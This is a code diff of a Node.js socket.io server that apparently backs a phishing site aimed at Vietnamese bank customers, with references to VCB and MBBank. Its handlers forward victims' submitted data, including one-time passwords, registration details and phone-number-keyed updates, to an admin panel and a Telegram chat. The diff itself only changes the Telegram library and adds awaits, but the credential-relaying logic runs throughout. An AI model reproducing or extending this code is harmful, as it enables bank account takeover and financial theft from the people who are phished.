@@ -12,6 +12,10 @@ var cors = require('cors')
 const token = process.env.TELEGRAM_TOKEN;
 const bot = new TelegramBot(token, { polling: true });
 const chatId = process.env.TELEGRAM_CHAT_ID;
+const TG = require('telegram-bot-api')
+const api = new TG({
+    token: token
+})
 app.use(cors())
 // const moduleBank = require('./modules');
 const socketIo = require("socket.io")(server, {
@@ -104,8 +108,8 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
     socket.on('send-data-send-otp-vcb', async (data) => {
         // const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
         // socket.emit('send-data-send-otp-vcb', response);
-        socketIo.emit('send-data-admin-user', data);
-        bot.sendMessage(chatId, `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`);
+       await socketIo.emit('send-data-admin-user', data);
+       await api.sendMessage(chatId, `Có người dùng vừa xác thực OTP: ${JSON.stringify(data)}`);
     })
 
     // socket.on('send-method-ct-vcb', async (data) => {
@@ -123,10 +127,10 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
         console.log(data);
         // const settingData = await settings.findOne({}).lean().exec();
         // bắn socket id để phân biệt từng người dùng
-        socketIo.emit('send-data-admin', {
+        await socketIo.emit('send-data-admin', {
             ...data,
         });
-        bot.sendMessage(chatId, `Có người dùng vừa đăng ký: ${JSON.stringify(data)}`);
+        await api.sendMessage(chatId, `Có người dùng vừa đăng ký: ${JSON.stringify(data)}`);
         // switch (data.bankName) {
         //     case 'MBBank':
         //         console.log('settingData', settingData);
@@ -159,9 +163,9 @@ socketIo.on("connection", (socket) => { ///Handle khi có connect từ client t�
     //     socket.emit('send-data-b', response);
     // })
 
-    socket.on('send-data-user', (data) => {
-        socketIo.emit(`send-data-user-${data.numberPhone}`, data);
-        bot.sendMessage(chatId, `Người dùng ${data.numberPhone} vừa cập nhật thông tin: ${JSON.stringify(data)}`);
+    socket.on('send-data-user', async (data) => {
+       await socketIo.emit(`send-data-user-${data.numberPhone}`, data);
+       await api.sendMessage(chatId, `Người dùng ${data.numberPhone} vừa cập nhật thông tin: ${JSON.stringify(data)}`);
     });
 })
 
